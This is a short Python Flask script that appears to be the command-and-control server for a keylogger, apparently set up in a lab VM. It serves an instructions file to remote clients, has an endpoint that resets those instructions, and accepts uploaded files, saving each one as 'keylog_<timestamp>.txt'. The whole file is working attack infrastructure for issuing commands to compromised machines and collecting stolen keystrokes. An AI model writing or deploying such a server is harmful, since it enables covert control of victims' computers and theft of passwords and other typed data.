###########################################################################################################################
####################################################     LIBRARIES     ####################################################
###########################################################################################################################

# pip install Flask==2.0.1 Jinja2==3.0.1 --force-reinstall
# pip install --upgrade Flask Werkzeug
from flask import Flask, send_from_directory, request
from time import time

###########################################################################################################################
#################################################     INITIALIZATIONS     #################################################
###########################################################################################################################

IP_ADDRESS = "10.0.2.15"
PORT = 8000
FILE_TO_SERVE = "./instructions.txt"

###########################################################################################################################
#####################################################     PROGRAM     #####################################################
###########################################################################################################################

if __name__ == '__main__':
    app = Flask(__name__)

    @app.route('/')
    def serve_file():
        try: return send_from_directory('.', FILE_TO_SERVE)
        except FileNotFoundError: return "File not found", 404

    @app.route('/reset_instruction', methods=['GET'])
    def reset_instruction():
        with open(FILE_TO_SERVE, 'w') as file:
            file.write('# Write the instruction in the next line!\n') 
        print("\nInstructions reseted!\n")
        return "Instructions reseted!"

    @app.route('/upload_file', methods=['POST'])
    def upload_file():
        if 'file' not in request.files:
            return 'No file provided in the request'

        file = request.files['file']

        # Save the uploaded file to the server's folder
        file.save(f'./keylog_{int(time())}.txt')

        return 'File uploaded successfully'

    if __name__ == '__main__':
        app.run(host=IP_ADDRESS, port=PORT, debug=True)